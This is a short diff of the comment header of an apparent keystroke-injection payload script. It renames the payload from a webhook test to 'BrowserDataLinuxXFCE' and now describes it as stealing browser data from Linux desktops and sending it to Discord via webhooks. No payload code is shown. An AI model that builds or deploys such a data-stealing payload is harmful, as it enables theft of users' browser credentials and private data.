@@ -1,8 +1,8 @@
-REM     Title: Test Coin
+REM     Title: BrowserDataLinuxXFCE
 
 REM     Author: MagikarpLv13
 
-REM     Description: This payload is meant to test Discord Webhooks
+REM     Description: This payload is meant to steal browser data and send it to Discord via Webhooks
 
 REM     Target: GNOME, Xfce, MATE
 
